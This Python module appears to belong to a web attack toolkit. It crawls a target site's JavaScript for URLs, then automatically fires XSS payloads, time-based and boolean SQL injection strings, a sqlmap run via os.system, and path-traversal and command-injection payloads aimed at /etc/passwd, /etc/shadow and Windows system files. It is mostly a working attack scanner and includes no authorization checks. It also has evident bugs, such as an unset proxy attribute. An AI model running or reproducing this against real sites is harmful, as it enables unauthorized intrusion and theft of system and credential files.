#!/user/bin/env python3
# -*- coding: utf-8 -*-
# ! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time
import requests, re
import urllib3
from requests.packages import urllib3
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, wait, as_completed
from pub.com.outprint import OutPrintInfo, OutPrintInfoErr,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.progress import Progress



class JsFinderScan2:
    def __init__(self):
        self.cookie = None
        self._threads = 10
        self.header = None

    def extract_URL(self, JS):
        pattern_raw = r"""
    	  (?:"|')                               # Start newline delimiter
    	  (
    	    ((?:[a-zA-Z]{1,10}://|//)           # Match a scheme [a-Z]*1-10 or //
    	    [^"'/]{1,}\.                        # Match a domainname (any character + dot)
    	    [a-zA-Z]{2,}[^"']{0,})              # The domainextension and/or path
    	    |
    	    ((?:/|\.\./|\./)                    # Start with /,../,./
    	    [^"'><,;| *()(%%$^/\\\[\]]          # Next character can't be...
    	    [^"'><,;|()]{1,})                   # Rest of the characters can't be
    	    |
    	    ([a-zA-Z0-9_\-/]{1,}/               # Relative endpoint with /
    	    [a-zA-Z0-9_\-/]{1,}                 # Resource name
    	    \.(?:[a-zA-Z]{1,4}|action)          # Rest + extension (length 1-4 or action)
    	    (?:[\?|/][^"|']{0,}|))              # ? mark with parameters
    	    |
    	    ([a-zA-Z0-9_\-]{1,}                 # filename
    	    \.(?:php|asp|aspx|jsp|json|
    	         action|html|js|txt|xml)             # . + extension
    	    (?:\?[^"|']{0,}|))                  # ? mark with parameters
    	  )
    	  (?:"|')                               # End newline delimiter
    	"""
        pattern = re.compile(pattern_raw, re.VERBOSE)
        result = re.finditer(pattern, str(JS))
        if result == None:
            return None
        js_url = []
        return [match.group().strip('"').strip("'") for match in result
                if match.group() not in js_url]

    # Get the page source
    def Extract_html(self, URL):
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36",
            "Cookie": self.cookie}
        try:
            raw = requests.get(URL, headers=header, timeout=3, verify=self._ssl, proxies=self._proxy)
            raw = raw.content.decode("utf-8", "ignore")
            # print(1)
            return raw
        except:
            return None

    # Handling relative URLs
    def process_url(self, URL, re_URL):
        black_url = ["javascript:"]  # Add some keyword for filter url.
        URL_raw = urlparse(URL)
        ab_URL = URL_raw.netloc
        host_URL = URL_raw.scheme
        if re_URL[0:2] == "//":
            result = host_URL + ":" + re_URL
        elif re_URL[0:4] == "http":
            result = re_URL
        elif re_URL[0:2] != "//" and re_URL not in black_url:
            if re_URL[0:1] == "/":
                result = host_URL + "://" + ab_URL + re_URL
            else:
                if re_URL[0:1] == ".":
                    if re_URL[0:2] == "..":
                        result = host_URL + "://" + ab_URL + re_URL[2:]
                    else:
                        result = host_URL + "://" + ab_URL + re_URL[1:]
                else:
                    result = host_URL + "://" + ab_URL + "/" + re_URL
        else:
            result = URL
        return result

    def find_last(self, string, str):
        positions = []
        last_position = -1
        while True:
            position = string.find(str, last_position + 1)
            if position == -1: break
            last_position = position
            positions.append(position)
        return positions

    def find_by_url(self, url, js=False):
        if js == False:
            try:
                OutPrintInfo("Web-All", f"{url}")
            except:
                OutPrintInfoErr("请提交正确的URL如https://www.baidu.com")
            html_raw = self.Extract_html(url)
            if html_raw == None:
                OutPrintInfo("Web-All", f"无法访问[b bright_red]{url}[/b bright_red]")
                return None
            # print(html_raw)
            html = BeautifulSoup(html_raw, "html.parser")
            html_scripts = html.findAll("script")
            script_array = {}
            script_temp = ""
            for html_script in html_scripts:
                script_src = html_script.get("src")
                if script_src == None:
                    script_temp += html_script.get_text() + "\n"
                else:
                    purl = self.process_url(url, script_src)
                    script_array[purl] = self.Extract_html(purl)
            script_array[url] = script_temp
            allurls = []
            for script in script_array:
                # print(script)
                temp_urls = self.extract_URL(script_array[script])
                if len(temp_urls) == 0: continue
                for temp_url in temp_urls:
                    allurls.append(self.process_url(script, temp_url))
            result = []
            for singerurl in allurls:
                url_raw = urlparse(url)
                domain = url_raw.netloc
                positions = self.find_last(domain, ".")
                miandomain = domain
                if len(positions) > 1: miandomain = domain[positions[-2] + 1:]
                # print(miandomain)
                suburl = urlparse(singerurl)
                subdomain = suburl.netloc
                # print(singerurl)
                if miandomain in subdomain or subdomain.strip() == "":
                    if singerurl.strip() not in result:
                        result.append(singerurl)
            return result
        return sorted(set(self.extract_URL(self.Extract_html(url)))) or None

    def find_subdomain(self, urls, mainurl):
        url_raw = urlparse(mainurl)
        domain = url_raw.netloc
        miandomain = domain
        positions = self.find_last(domain, ".")
        if len(positions) > 1: miandomain = domain[positions[-2] + 1:]
        subdomains = []
        for url in urls:
            suburl = urlparse(url)
            subdomain = suburl.netloc
            # print(subdomain)
            if subdomain.strip() == "": continue
            if miandomain in subdomain:
                if subdomain not in subdomains:
                    subdomains.append(subdomain)
        return subdomains

    def find_by_url_deep(self, url):
        html_raw = self.Extract_html(url)
        # print(html_raw)
        if html_raw == None:
            OutPrintInfo("Web-All", f"无法访问{url}")
            return None
        html = BeautifulSoup(html_raw, "html.parser")
        html_as = html.findAll("a")
        links = []
        for html_a in html_as:
            src = html_a.get("href")
            if src == "" or src == None: continue
            link = self.process_url(url, src)
            if link not in links:
                links.append(link)
        if links == []: return None
        OutPrintInfo("Web-All", f"共找到[b bright_red]{str(len(links))}[/b bright_red]个链接")
        urls = []
        i = len(links)
        for link in links:
            temp_urls = self.find_by_url(link)
            if temp_urls == None: continue
            OutPrintInfo("Web-All",
                         f"从{str(i)}个结果中找到[b bright_red]{str(len(temp_urls))}[/b bright_red]个URL在{link}")
            for temp_url in temp_urls:
                if temp_url not in urls:
                    urls.append(temp_url)
            i -= 1
        return urls

    def giveresult(self, urls, domian):
        if urls == None:
            return None
        OutPrintInfo("Web-All", f"共找到[b bright_red]{str(len(urls))}[/b bright_red]个URL:")
        content_url = ""
        content_subdomain = ""
        for url in urls:
            content_url += url + "\n"
            OutPrintInfo("Web-All", f"{url}")
        subdomains = self.find_subdomain(urls, domian)
        OutPrintInfo("Web-All", f"共找到[b bright_red]{str(len(subdomains))}[/b bright_red]个域名:")
        for subdomain in subdomains:
            content_subdomain += subdomain + "\n"
            OutPrintInfo("Web-All", f"[b bright_red]{subdomain}")

        self.check(urls)

    def xss(self, url, payload):
        header = {
            "User-Agent": self.header
        }
        try:
            req_url = url + payload
            urllib3.disable_warnings()
            response = requests.get(req_url, headers=header, verify=self._ssl, proxies=self._proxy)
            if payload in response.text and response.status_code == 200:
                OutPrintInfoSuc("Web-All", f"存在XSS漏洞,URL:{req_url}")
        except Exception as e:
            pass

    def sql_time(self, url):
        header = {
            "User-Agent": self.header
        }
        try:
            urllib3.disable_warnings()
            start = time.time()
            response = requests.get(url, headers=header, verify=self._ssl, proxies=self._proxy)
            end = time.time()
            if end - start > 10:
                OutPrintInfoSuc("Web-All", f"存在SQL-Time漏洞,URL:{url}")
        except Exception as e:
            pass

    def sql_get(self, url, req_len):
        header = {
            "User-Agent": self.header
        }
        try:
            urllib3.disable_warnings()
            response = requests.get(url, headers=header, verify=self._ssl, proxies=self._proxy)
            resp_len = len(response.text)

            if req_len != resp_len:
                OutPrintInfoSuc("Web-All",
                             f"存在SQL-Get漏洞,URL:{url} 正常请求长度:[b bright_red]{req_len}[/b bright_red] | 注入请求长度:[b bright_red]{resp_len}[/b bright_red]")
        except Exception as e:
            pass

    def webDir(self, url):
        header = {
            "User-Agent": self.header
        }
        try:
            urllib3.disable_warnings()
            response = requests.get(url, headers=header, verify=self._ssl, proxies=self._proxy)
            response.encoding = response.apparent_encoding
            contents = response.headers.get('Content-Disposition', '')
            if 'attachment' in contents.lower() or "root:" in response.text or "16-bit" in response.text:
                OutPrintInfoSuc("Web-All", f"存在目录穿越漏洞,URL:{url}")
        except Exception as e:
            pass

    def check(self, urls):
        ck_url = []
        for ck in urls:
            if "=" in ck and ".css" not in ck and ".svg" not in ck:
                ck_url.append(ck)
            if "admin" in ck:
                OutPrintInfoSuc("Web-All", f"检测到敏感路径:{ck}")


        if ck_url:
            OutPrintInfo("Web-All", f"共检测到[b bright_red]{str(len(ck_url))}[/b bright_red]个穿参URL")
            OutPrintInfo("Web-All", "开始进行[b bright_red]SQL/XSS/目录穿越[/b bright_red]检测")
            xss_list = []
            sql_list = []
            mb_list = []
            OutPrintInfo("Web-All", "开始加载XSS-Payload...")
            with open("./dict/xssPayload.txt", 'r') as f:
                for xss in f:
                    xss_list.append(xss.strip())
            OutPrintInfo("Web-All", "XSS-Payload[b bright_red]加载完成[/b bright_red]")
            OutPrintInfo("Web-All", "开始加载SQL-Payload...")
            with open("./dict/sqlTime.txt", 'r') as f:
                for sql in f:
                    sql_list.append(sql.strip())
            OutPrintInfo("Web-All", "SQL-Payload[b bright_red]加载完成[/b bright_red]")
            for mb in ck_url:
                mb_list.append(mb.split("=")[0] + "=")
            OutPrintInfo("Web-All", "开始检测XSS...")
            # xss
            with Progress(transient=True) as progress:
                tasks = progress.add_task("[b cyan] XSS检测中...", total=len(ck_url)*len(xss_list), )
                with ThreadPoolExecutor(self._threads) as pool:
                    for url in mb_list:
                        futures = [pool.submit(self.xss, url.strip(), payload) for payload in xss_list]
                        for future in as_completed(futures):
                            future.result()
                            progress.update(tasks, advance=1)

                wait(futures)
            OutPrintInfo("Web-All", "XSS检测结束")
            time.sleep(1)
            # sql time
            OutPrintInfo("Web-All", "开始检测SQL-Time...")
            with Progress(transient=True) as progress:
                tasks = progress.add_task("[b cyan] SQL-Time检测中...", total=len(ck_url)*len(sql_list), )
                with ThreadPoolExecutor(self._threads) as pool:
                    for url in mb_list:
                        futures = [pool.submit(self.sql_time, url.strip() + payload) for payload in sql_list]
                        for future in as_completed(futures):
                            future.result()
                            progress.update(tasks, advance=1)
                wait(futures)
            OutPrintInfo("Web-All", "SQL-Time检测结束")
            time.sleep(1)

            OutPrintInfo("Web-All", "开始检测SQL-GET...")
            # sql get
            get_list = [
                "'))%0aOr%0aFalse=",
                "'))%0aOr%0aFalse='",
                "'))%0aOr%0aFalse='#",
                "'))%0aaNd%0aFalse=",
                "'))%0aaNd%0aFalse='",
                "'))%0aaNd%0aFalse='#",
                "1'%0aaNd%0aFalse-- a",
                "1'%0aaNd%0aFalse'",
                "1'%0aaNd%0aFalse#",
                "-1'%0aaNd%0aFalse-- a",
                "-1'%0aaNd%0aFalse'",
                "-1'%0aaNd%0aFalse#",
                '1"%0aaNd%0aFalse-- a',
                '1"%0aaNd%0aFalse"',
                '1"%0aaNd%0aFalse#',
            ]
            urllib3.disable_warnings()
            header = {
                "User-Agent": self.header
            }
            try:
                response = requests.get(url, headers=header, verify=self._ssl, proxies=self._proxy)
            except Exception:
                pass
            req = lambda req_url: requests.get(req_url, headers=header, verify=self._ssl, proxies=self._proxy)
            req_len = len(req(url).text)
            with Progress(transient=True) as progress:
                tasks = progress.add_task("[b cyan] SQL-GET检测中...", total=len(ck_url)*len(get_list))
                with ThreadPoolExecutor(self._threads) as pool:
                    for url in mb_list:
                        futures = [pool.submit(self.sql_get, url.strip() + payload, req_len) for payload in get_list]
                        for future in as_completed(futures):
                            future.result()
                            progress.update(tasks, advance=1)
                wait(futures)
            OutPrintInfo("Web-All", "SQL-GET检测结束")
            time.sleep(1)
            OutPrintInfo("Web-All", "开始随机抽取进行SQL检测...")
            OutPrintInfo("Web-All", "sqlmap启动...")
            sql_cs_url = mb_list[0]
            import os

            try:
                dir = os.getcwd()
                OutPrintInfo("SqlMap",f"[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u \"{sql_cs_url}1\" --output-dir={dir}/result/ --batch")
                os.system(f"sqlmap -u \"{sql_cs_url}1\" --output-dir={dir}/result/ --batch")
                # sys.exit()
            except Exception as e:
                OutPrintInfoErr(e)

            # web dir
            OutPrintInfo("Web-All", "开始检测目录穿越...")
            web_dir_list = [
                "/../../../../../../../../../etc/passwd",
                "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                "/../../../../..//./../../../../etc/passwd",
                "/../../../../../;/./../../../../etc/passwd",
                "/../../../../../%0a/../../../../../etc/passwd",
                "/../../../../../foo/../../../../../etc/passwd",
                "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00",
                "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini",
                "//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini",
                "/\\&apos;/bin/cat%20/etc/passwd\\&apos;",
                "/\\&apos;/bin/cat%20/etc/shadow\\&apos;",
                "/../../../../../../../../conf/server.xml",
                "//../../../../../../../../bin/id|",
                "/C:/inetpub/wwwroot/global.asa",
                "/C:\inetpub\wwwroot\global.asa",
                "/C:/boot.ini",
                "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/C:/boot.ini",
                "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/C:/Windows/win.ini",
                "/C:\boot.ini",
                "/../../../../../../../../../../../../localstart.asp%00",
                "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/localstart.asp",
                "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/boot.ini%00",
                "/../../../../../../../../../../../../boot.ini",
            ]
            with Progress(transient=True) as progress:
                tasks = progress.add_task("[b cyan] 目录穿越检测中...", total=len(ck_url)*len(web_dir_list), )
                with ThreadPoolExecutor(self._threads) as pool:
                    for url in mb_list:
                        futures = [pool.submit(self.webDir, url.strip() + payload) for payload in web_dir_list]
                        for future in as_completed(futures):
                            future.result()
                            progress.update(tasks, advance=1)
                wait(futures)
            time.sleep(1)
            OutPrintInfo("Web-All", "目录穿越检测结束")

    def main(self, target):
        urllib3.disable_warnings()
        url = target["url"].strip('/ ')
        self.cookie = target["cookie"]
        depth = target["depth"]
        self._threads = int(target["threads"])
        self.header = target["header"]
        proxy = target["proxy"]
        self._ssl = target["ssl"]

        _, self.proxy = ReqSet(proxy=proxy)

        if depth is not True:
            urls = self.find_by_url(url)
            self.giveresult(urls, url)
        else:
            urls = self.find_by_url_deep(url)
            self.giveresult(urls, url)
